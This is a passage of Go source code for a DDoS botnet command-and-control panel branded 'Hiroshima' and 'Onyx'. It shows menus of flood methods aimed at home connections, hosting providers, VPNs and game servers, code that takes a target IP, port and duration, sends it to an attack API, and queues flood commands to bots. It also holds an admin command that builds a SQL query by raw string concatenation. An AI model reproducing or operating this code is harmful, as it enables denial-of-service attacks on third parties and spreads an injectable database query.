            this.conn.Write([]byte("\033[93m                   ║ .stdhex [ip] [time\033[37m] dport=[port]      ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .udphex [ip] [time\033[37m] dport=[port]      ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .greeth [ip] [time\033[37m] dport=[port]      ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .tcpall [ip] [time\033[37m] dport=[port]      ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .udpplain [ip] [ti\033[37mme] dport=[port]    ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ╚═══════════════════\033[37m════════════════════╝   \033[0m \r\n"))
            continue
        }
                if err != nil || cmd == ".attack" || cmd == ".ATTACK" || cmd == "methods" || cmd == "METHODS" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte(banner()))
            this.conn.Write([]byte("        \x1b[38;2;222;31;171m╔\x1b[38;2;223;43;175m═\x1b[38;2;224;55;179m═\x1b[38;2;225;67;183m═\x1b[38;2;226;79;187m═\x1b[38;2;227;91;191m═\x1b[38;2;228;103;195m═\x1b[38;2;229;115;199m═\x1b[38;2;230;127;203m═\x1b[38;2;231;139;207m═\x1b[38;2;232;151;211m═\x1b[38;2;233;163;215m═\x1b[38;2;234;175;219m═\x1b[38;2;235;187;223m═\x1b[38;2;236;199;227m═\x1b[38;2;237;211;231m═\x1b[38;2;238;223;235m╗\x1b[38;2;239;235;239m\x1b[38;2;222;31;171m╔\x1b[38;2;224;45;176m═\x1b[38;2;226;59;181m═\x1b[38;2;228;73;186m═\x1b[38;2;230;87;191m═\x1b[38;2;232;101;196m═\x1b[38;2;234;115;201m═\x1b[38;2;236;129;206m═\x1b[38;2;238;143;211m═\x1b[38;2;240;157;216m═\x1b[38;2;242;171;221m═\x1b[38;2;244;185;226m═\x1b[38;2;246;199;231m═\x1b[38;2;248;213;236m═\x1b[38;2;250;227;241m╗\x1b[38;2;252;241;246m\x1b[38;2;222;31;171m╔\x1b[38;2;224;45;176m═\x1b[38;2;226;59;181m═\x1b[38;2;228;73;186m═\x1b[38;2;230;87;191m═\x1b[38;2;232;101;196m═\x1b[38;2;234;115;201m═\x1b[38;2;236;129;206m═\x1b[38;2;238;143;211m═\x1b[38;2;240;157;216m═\x1b[38;2;242;171;221m═\x1b[38;2;244;185;226m═\x1b[38;2;246;199;231m═\x1b[38;2;248;213;236m═\x1b[38;2;250;227;241m╗\x1b[38;2;252;241;246m\x1b[38;2;222;31;171m╔\x1b[38;2;223;43;175m═\x1b[38;2;224;55;179m═\x1b[38;2;225;67;183m═\x1b[38;2;226;79;187m═\x1b[38;2;227;91;191m═\x1b[38;2;228;103;195m═\x1b[38;2;229;115;199m═\x1b[38;2;230;127;203m═\x1b[38;2;231;139;207m═\x1b[38;2;232;151;211m═\x1b[38;2;233;163;215m═\x1b[38;2;234;175;219m═\x1b[38;2;235;187;223m═\x1b[38;2;236;199;227m═\x1b[38;2;237;211;231m═\x1b[38;2;238;223;235m╗\x1b[38;2;239;235;239m\r\n"))
            this.conn.Write([]byte("        \x1b[38;2;222;31;171m║ \x1b[1;37mHIROSHIMA-HOME\x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║\x1b[1;37mHIROSHIMA-OVH\x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║\x1b[1;37mHIROSHIMA-NFO\x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║\x1b[1;37mHIROSHIMA-WEBv2\x1b[38;2;238;223;235m║\r\n"))
this.conn.Write([]byte("        \x1b[38;2;222;31;171m║ \x1b[1;37mHOME-DEFILE   \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║\x1b[1;37mHIROSHIMA-VPN\x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║ \x1b[1;37mNFO-DEFILE  \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║\x1b[1;37mHIROSHIMA-WEBS \x1b[38;2;238;223;235m║\r\n"))
this.conn.Write([]byte("        \x1b[38;2;222;31;171m║ \x1b[1;37mHOME-LITE     \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║ \x1b[1;37mOVH-DEFILE  \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║ \x1b[1;37mNFO-LITE    \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║\x1b[1;37mHIROSHIMA-PATH \x1b[38;2;238;223;235m║\r\n"))
this.conn.Write([]byte("        \x1b[38;2;222;31;171m║ \x1b[1;37mHOME-VIOLATE  \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║ \x1b[1;37mVPN-ALL     \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║ \x1b[1;37mNFO-VIOLATE \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║\x1b[1;37mHIROSHIMA-CHOOP\x1b[38;2;238;223;235m║\r\n"))
this.conn.Write([]byte("        \x1b[38;2;222;31;171m║ \x1b[1;37mHOME-SEIZURE  \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║ \x1b[1;37m100up(down) \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║ \x1b[1;37mNFO-SEIZURE \x1b[38;2;238;223;235m║\x1b[38;2;222;31;171m║\x1b[1;37mHIROSHIMA-HYDRA\x1b[38;2;238;223;235m║\r\n"))
this.conn.Write([]byte("        \x1b[38;2;222;31;171m╚\x1b[38;2;223;43;175m═\x1b[38;2;224;55;179m═\x1b[38;2;225;67;183m═\x1b[38;2;226;79;187m═\x1b[38;2;227;91;191m═\x1b[38;2;228;103;195m═\x1b[38;2;229;115;199m═\x1b[38;2;230;127;203m═\x1b[38;2;231;139;207m═\x1b[38;2;232;151;211m═\x1b[38;2;233;163;215m═\x1b[38;2;234;175;219m═\x1b[38;2;235;187;223m═\x1b[38;2;236;199;227m═\x1b[38;2;237;211;231m═\x1b[38;2;238;223;235m╝\x1b[38;2;239;235;239m\x1b[38;2;222;31;171m╚\x1b[38;2;224;45;176m═\x1b[38;2;226;59;181m═\x1b[38;2;228;73;186m═\x1b[38;2;230;87;191m═\x1b[38;2;232;101;196m═\x1b[38;2;234;115;201m═\x1b[38;2;236;129;206m═\x1b[38;2;238;143;211m═\x1b[38;2;240;157;216m═\x1b[38;2;242;171;221m═\x1b[38;2;244;185;226m═\x1b[38;2;246;199;231m═\x1b[38;2;248;213;236m═\x1b[38;2;250;227;241m╝\x1b[38;2;252;241;246m\x1b[38;2;222;31;171m╚\x1b[38;2;224;45;176m═\x1b[38;2;226;59;181m═\x1b[38;2;228;73;186m═\x1b[38;2;230;87;191m═\x1b[38;2;232;101;196m═\x1b[38;2;234;115;201m═\x1b[38;2;236;129;206m═\x1b[38;2;238;143;211m═\x1b[38;2;240;157;216m═\x1b[38;2;242;171;221m═\x1b[38;2;244;185;226m═\x1b[38;2;246;199;231m═\x1b[38;2;248;213;236m═\x1b[38;2;250;227;241m╝\x1b[38;2;252;241;246m\x1b[38;2;222;31;171m╚\x1b[38;2;223;43;175m═\x1b[38;2;224;55;179m═\x1b[38;2;225;67;183m═\x1b[38;2;226;79;187m═\x1b[38;2;227;91;191m═\x1b[38;2;228;103;195m═\x1b[38;2;229;115;199m═\x1b[38;2;230;127;203m═\x1b[38;2;231;139;207m═\x1b[38;2;232;151;211m═\x1b[38;2;233;163;215m═\x1b[38;2;234;175;219m═\x1b[38;2;235;187;223m═\x1b[38;2;236;199;227m═\x1b[38;2;237;211;231m═\x1b[38;2;238;223;235m╝\x1b[38;2;239;235;239m\r\n"))
this.conn.Write([]byte("                  \x1b[38;2;222;31;171m╔════════════════════════════════════════════╗\r\n"))
this.conn.Write([]byte("                  \x1b[38;2;222;31;171m║ \x1b[1;37mHIROSHIMA-GAME, GAME-DEFILE, HIROSHIMA-FN. \x1b[38;2;222;31;171m║\r\n"))
this.conn.Write([]byte("                  \x1b[38;2;222;31;171m╚════════════════════════════════════════════╝\r\n"))
this.conn.Write([]byte("                  \x1b[38;2;222;31;171m╔════════════════════════════════════════════╗\r\n"))
this.conn.Write([]byte("                  \x1b[38;2;222;31;171m║ \x1b[1;37mGAME-LITE, HIROSHIMA-R6, HIROSHIMA-FIVEM.  \x1b[38;2;222;31;171m║\r\n"))
this.conn.Write([]byte("                  \x1b[38;2;222;31;171m╚════════════════════════════════════════════╝\r\n"))
this.conn.Write([]byte("                  \x1b[38;2;222;31;171m╔════════════════════════════════════════════╗\r\n"))
this.conn.Write([]byte("                  \x1b[38;2;222;31;171m║ \x1b[1;37mDVR, HIROSHIMA-ARK, DVR-ALL, HOMEKILL.     \x1b[38;2;222;31;171m║\r\n"))
this.conn.Write([]byte("                  \x1b[38;2;222;31;171m╚════════════════════════════════════════════╝\r\n"))
            continue
        }
        if err != nil || cmd == "themes" || cmd == "themes" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte(banner())) 
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                       ╔══════════════════════════════════════╗       \033[0m \r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                       ║       \x1b[4;37mPrimitive   \x1b[0m \x1b[4;37mservices\x1b[0m          \x1b[38;2;45;31;171m║       \033[0m \r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                   ╔═══╩══════════════════════════════════════╩═══╗   \033[0m \r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                   ║ \x1b[1;36mtheme1                                       \x1b[38;2;45;31;171m║   \033[0m \r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                   ║ \x1b[1;36mtheme2                                       \x1b[38;2;45;31;171m║   \033[0m \r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                   ║ \x1b[1;36mtheme3                                       \x1b[38;2;45;31;171m║   \033[0m \r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                   ╚══════════════════════════════════════════════╝   \033[0m \r\n"))
            continue
        }
        if cmd == "theme1" {
           this.conn.Write([]byte(theme3()))  
           continue 
        }
        if cmd == "theme2" {
           this.conn.Write([]byte(theme2()))  
           continue 
        }
        if cmd == "theme3" {
           this.conn.Write([]byte(banner()))
           this.conn.Write([]byte(help2()))  
           continue 
        }

        if cmd == "users" {

    defer session.Remove()

            var i = 0
            for _, s := range sessions {
                i++
                line := fmt.Sprintf("%d, %s", i, s.Username)
                fmt.Fprintf(this.conn, "\033[00;1;96m║\033[00;1;95m%s\033[0m\r\n", (line))
                continue

            }
        }
/*
    						  ╔═══════════════╗╔═════════════╗╔═════════════╗╔═══════════════╗
     																		 ║ ONYX-HOME     ║║ FN-ONYX     ║║ VPN-CREAM   ║║ONYX-DEDIFUCKER║
     																		 ║ LDAP          ║║ R6-ONYX     ║║ ONYX-WEBRAPE║║     -         ║
      																		 ║ NFO-ONYXv2    ║║ DVR         ║║ CHOOPA-DOWN ║║     -         ║
     																		 ║ ONYX-OVH      ║║ 100UP-ONYX  ║║ ONYX-ZOOM   ║║     -         ║
      																		 ║ HYDRA-FUCK    ║║ ONYX-RUST   ║║ ONYX-ARK    ║║     -         ║
      ╚════════╦══════╝╚═════════════╝╚═════════════╝╚══════╦════════╝
               ║ Syntax: (.attack)                          ║
               ║ Info: Max Boot Time For Bypass Is 200 Secs ║
               ╚════════════════════════════════════════════╝

*/

        if err != nil || cmd == "ONYX-HOME" || cmd == "LDAP" || cmd == "NFO-ONYXv2" || cmd == "ONYX-OVH" || cmd == "HYDRA-FUCK" || cmd == "FN-ONYX" || cmd == "R6-ONYX" || cmd == "100UP-ONYX" || cmd == "ONYX-RUST" || cmd == "VPN-CREAM" || cmd == "ONYX-WEBRAPE" || cmd == "CHOOPA-DOWN" || cmd == "ONYX-ZOOM" {
            this.conn.Write([]byte("\033[00;1;96m\033[4;35mIPv4\033[1;37m:\x1b[0m"))
            ipv, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[00;1;96m\033[4;35mPort\033[1;37m:\x1b[0m"))
            portv, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[00;1;96m\033[4;35mTime\033[1;37m:\x1b[0m"))
            timev, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte(ban())) 
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mPrimitiveAPI Attacking(\033[1;37m"+ ipv +"\033[1;36m)\033[1;37m:(\033[1;37m"+ portv +"\033[1;36m)\r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mAttack sending for \033[4;35m"+ timev +" \033[1;37mseconds\x1b[0m\r\n"))

            url := ""+ ipv +"&port="+ portv +"&method="+ cmd +"&time="+ timev +""
            tr := &http.Transport{
                ResponseHeaderTimeout: 5 * time.Second,
                DisableCompression:    true,
            }
            client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has started\r\n"))
                time.Sleep(20000 * time.Millisecond)
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte(ban())) 
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ╔══════════════════════════════════════════╗\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mPrimitiveAPI Attacking(\033[1;37m"+ ipv +"\033[1;36m)\033[1;37m:(\033[1;37m"+ portv +"\033[1;36m)\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mAttack sending for \033[4;35m"+ timev +" \033[1;37mseconds\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has \x1b[1;32mFinished\r\n"))
                            cmdatks := "NormalAPI IP: "+ ipv +"  Time: "+ timev +""
            cmdatkss := ".std "+ ipv +" "+ timev +" dport="+ portv +""  
                var cmdatt = &cmdatt{
                ID:       time.Now().UnixNano(),
                Atks: cmdatks,
        }
    cmdattMutex.Lock()
    cmdsss[cmdatt.ID] = cmdatt
    cmdattMutex.Unlock()         
            cmdatk := cmdatkss
        atks, err := NewAttack(cmdatk, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atks.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atks.Duration, cmdatk, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atks) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[37mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            fmt.Println("\x1b[1;93m                              ║API Server Result\033[93m: \r\n\033[93m" + locformatted + "\x1b[0m\n")
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has started\r\n"))
                time.Sleep(20000 * time.Millisecond)
                this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte(ban())) 
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ╔══════════════════════════════════════════╗\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mPrimitiveAPI Attacking(\033[1;37m"+ ipv +"\033[1;36m)\033[1;37m:(\033[1;37m"+ portv +"\033[1;36m)\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mAttack sending for \033[4;35m"+ timev +" \033[1;37mseconds\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36mYour 20 cooldown has \x1b[1;32mFinished\r\n"))
            cmdatks := "PrimitiveAPI IP: "+ ipv +"  Time: "+ timev +""
            cmdatkss := ".std "+ ipv +" "+ timev +" dport="+ portv +""  
                var cmdatt = &cmdatt{
                ID:       time.Now().UnixNano(),
                Atks: cmdatks,
        }
    cmdattMutex.Lock()
    cmdsss[cmdatt.ID] = cmdatt
    cmdattMutex.Unlock()         
            cmdatk := cmdatkss
        atks, err := NewAttack(cmdatk, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atks.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atks.Duration, cmdatk, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atks) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
        continue    
    }
                if username == "free" && cmd == ".vip" {
                this.conn.Write([]byte("\033[00;1;96m\033[4;35mYou dont have access to this\033[1;37m\x1b[0m\r\n"))
                continue   
                } 
            
            /*
                                          ╔═══════════════╗╔═════════════╗╔═════════════╗╔═══════════════╗
                                                                                                                                                                                                                                                                                                                                                ║ HIROSHIMA-HOME║║HIROSHIMA-OVH║║HIROSHIMA-NFO║║HIROSHIMA-WEBv2║
                                                                                                                                                                                                                                                                                                                                                ║ HOME-DEFILE   ║║HIROSHIMA-VPN║║ NFO-DEFILE  ║║HIROSHIMA-WEBS ║
                                                                                                                                                                                                                                                                                                                                                ║ HOME-LITE     ║║ OVH-DEFILE  ║║ NFO-LITE    ║║HIROSHIMA-PATH ║
                                                                                                                                                                                                                                                                                                                                                ║ HOME-VIOLATE  ║║ VPN-ALL     ║║ NFO-VIOLATE ║║HIROSHIMA-CHOOP║
                                                                                                                                                                                                                                                                                                                                                ║ HOME-SEIZURE  ║║ 100up(down) ║║ NFO-SEIZURE ║║HIROSHIMA-HYDRA║
                                                                                                                                                                                                                                                                                                                                                ╚════════╦══════╝╚═════════════╝╚═════════════╝╚══════╦════════╝
                                                                                                                                                                                                                                                                                                                                                ║ Syntax: (.attack)                             ║
                                                                                                                                                                                                                                                                                                                                                ║ Info: Max Boot Time For Bypass Is 200 Secs ║
                                                                                                                                                                                                                                                                                                                                                ╔════════╩══════╗╔═════════════╗╔═════════════╗╔══════╩════════╗
                                                                                                                                                                                                                                                                                                                                                ║ HIROSHIMA-GAME║║ GAME-DEFILE ║║     -       ║║     -         ║
                                                                                                                                                                                                                                                                                                                                                ║ HIROSHIMA-CW  ║║ GAME-LITE   ║║     -       ║║     -         ║
                                                                                                                                                                                                                                                                                                                                                ║ HIROSHIMA-ARK ║║ DVR         ║║     -       ║║     -         ║
                                                                                                                                                                                                                                                                                                                                                ║ HIROSHIMA-FN  ║║ DVR-ALL     ║║     -       ║║     -         ║
                                                                                                                                                                                                                                                                                                                                                ║HIROSHIMA-FIVEM║║ HIROSHIMA-R6║║     -       ║║     -         ║
                                                                                                                                                                                                                                                                                                                                                ╚═══════════════╝╚═════════════╝╚═════════════╝╚═══════════════╝

            */
            if strings.Contains(username, " ") {
            this.conn.Write([]byte("                                \033[1;31mThought i couldnt fix it huh\033[0m\r\n"))
            time.Sleep(20000 * time.Millisecond)
            return
            }
            
            args := strings.Split(cmd, " ")
            if userInfo.admin == 1 && args[0] == "addreg" && len(args) > 2 {
                new_un := args[1]
                new_pw := args[2]
                _, err = database.db.Exec("INSERT INTO users VALUES (NULL, '"+ new_un +"', '"+ new_pw +"', 0, 0, 0, 0, -1, 0, 30, '');")
                if err != nil {
                    fmt.Println(err)
                    fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mError\033[0m\r")
                    continue
                }
                continue
            }
            if userInfo.admin == 1 && args[0] == "addreg" && len(args) < 4 {
                this.conn.Write([]byte("\x1b[1;31maddreg username password\r\n"))
                continue
            }
            if args[0] == "apisend" && len(args) < 4 {
                this.conn.Write([]byte("\x1b[1;31mapisend (METHOD) (IP) (PORT) (TIME)\r\n"))
                continue
            }

            if cmd == "HIROSHIMA-HOME" || cmd == "HOME-DEFILE" || cmd == "HOME-LITE" || cmd == "HOME-VIOLATE" || cmd == "HOME-SEIZURE" || cmd == "HIROSHIMA-OVH" || cmd == "HIROSHIMA-VPN" || cmd == "OVH-DEFILE" || cmd == "HIROSHIMA-100UP" || cmd == "VPN-ALL" || cmd == "HIROSHIMA-NFO" || cmd == "NFO-DEFILE" || cmd == "NFO-LITE" || cmd == "HIROSHIMA-GAME" || cmd == "HIROSHIMA-COLDWAR" || cmd == "HIROSHIMA-ARK" || cmd == "HIROSHIMA-FN" || cmd == "HIROSHIMA-FIVEM" || cmd == "GAME-DEFILE" || cmd == "DVR" || cmd == "DVR-ALL" || cmd == "NFO-VIOLATE" || cmd == "NFO-SEIZURE" || cmd == "HIROSHIMA-WEBv2" || cmd == "HIROSHIMA-WEBSERVER" || cmd == "HIROSHIMA-PATH" || cmd == "HIROSHIMA-CHOOPA" || cmd == "HIROSHIMA-HYDRA" {  
                this.conn.Write([]byte("\x1b[1;31mapisend (METHOD) (IP) (PORT) (TIME)\r\n"))
                continue
            } 
            if args[0] == "apisend" && len(args) > 4 {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            methodv := args[1]
            ipv := args[2]
            portv := args[3]
            timev := args[4]
            this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mH\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mS\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ ipv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mP\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mR\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ portv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mT\x1b[38;2;179;62;185mI\x1b[38;2;136;93;199mM\x1b[38;2;93;124;213mE\x1b[38;2;50;155;227m\x1b[1;37m: "+ timev +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36m\x1b[38;2;222;31;171mM\x1b[38;2;191;53;181mE\x1b[38;2;160;75;191mT\x1b[38;2;129;97;201mH\x1b[38;2;98;119;211mO\x1b[38;2;67;141;221mD\x1b[38;2;36;163;231m\x1b[1;37m: "+ methodv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
            this.conn.Write([]byte("\x1b[1;36m (\x1b[38;2;45;31;171mGuilty\x1b[1;37mAPI\x1b[1;36m) (\x1b[38;2;45;31;171mAttack Parsing\x1b[1;36m) 1/4\r\n"))
            time.Sleep(1000 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mH\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mS\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ ipv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mP\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mR\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ portv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mT\x1b[38;2;179;62;185mI\x1b[38;2;136;93;199mM\x1b[38;2;93;124;213mE\x1b[38;2;50;155;227m\x1b[1;37m: "+ timev +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36m\x1b[38;2;222;31;171mM\x1b[38;2;191;53;181mE\x1b[38;2;160;75;191mT\x1b[38;2;129;97;201mH\x1b[38;2;98;119;211mO\x1b[38;2;67;141;221mD\x1b[38;2;36;163;231m\x1b[1;37m: "+ methodv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
            this.conn.Write([]byte("\x1b[1;36m (\x1b[38;2;45;31;171mGuilty\x1b[1;37mAPI\x1b[1;36m) (\x1b[38;2;45;31;171mAttack Parsing\x1b[1;36m) 2/4\r\n"))
            time.Sleep(1000 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mH\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mS\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ ipv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mP\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mR\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ portv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mT\x1b[38;2;179;62;185mI\x1b[38;2;136;93;199mM\x1b[38;2;93;124;213mE\x1b[38;2;50;155;227m\x1b[1;37m: "+ timev +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36m\x1b[38;2;222;31;171mM\x1b[38;2;191;53;181mE\x1b[38;2;160;75;191mT\x1b[38;2;129;97;201mH\x1b[38;2;98;119;211mO\x1b[38;2;67;141;221mD\x1b[38;2;36;163;231m\x1b[1;37m: "+ methodv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
            this.conn.Write([]byte("\x1b[1;36m (\x1b[38;2;45;31;171mGuilty\x1b[1;37mAPI\x1b[1;36m) (\x1b[38;2;45;31;171mAttack Parsing\x1b[1;36m) 3/4\r\n"))
            time.Sleep(1000 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mH\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mS\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ ipv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mP\x1b[38;2;179;62;185mO\x1b[38;2;136;93;199mR\x1b[38;2;93;124;213mT\x1b[38;2;50;155;227m\x1b[1;37m: "+ portv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\x1b[38;2;222;31;171mT\x1b[38;2;179;62;185mI\x1b[38;2;136;93;199mM\x1b[38;2;93;124;213mE\x1b[38;2;50;155;227m\x1b[1;37m: "+ timev +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ║\033[1;36m\x1b[38;2;222;31;171mM\x1b[38;2;191;53;181mE\x1b[38;2;160;75;191mT\x1b[38;2;129;97;201mH\x1b[38;2;98;119;211mO\x1b[38;2;67;141;221mD\x1b[38;2;36;163;231m\x1b[1;37m: "+ methodv +"\r\n"))
                this.conn.Write([]byte("\x1b[38;2;45;31;171m                     ═════════════════════════════════════\r\n"))
            this.conn.Write([]byte("\x1b[1;36m (\x1b[38;2;45;31;171mGuilty\x1b[1;37mAPI\x1b[1;36m) (\x1b[38;2;45;31;171mAttack Parsing\x1b[1;36m) \x1b[1;32m4/4\r\n"))
            time.Sleep(1000 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
this.conn.Write([]byte("\x1b[0m ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄     .▄▄ · ▄▄▄ . ▐ ▄ ▄▄▄▄▄\r\n"))
this.conn.Write([]byte("\x1b[0m▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ▐█ ▀. ▀▄.▀·•█▌▐█•██  \r\n"))
this.conn.Write([]byte("\x1b[0m▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·    ▄▀▀▀█▄▐▀▀▪▄▐█▐▐▌ ▐█.▪\r\n"))
this.conn.Write([]byte("\x1b[0m▐█ ▪▐▌ ▐█▌· ▐█▌·▐█ ▪▐▌▐███▌▐█.█▌    ▐█▄▪▐█▐█▄▄▌██▐█▌ ▐█▌·\r\n"))
this.conn.Write([]byte("\x1b[0m ▀  ▀  ▀▀▀  ▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀   \r\n")) 
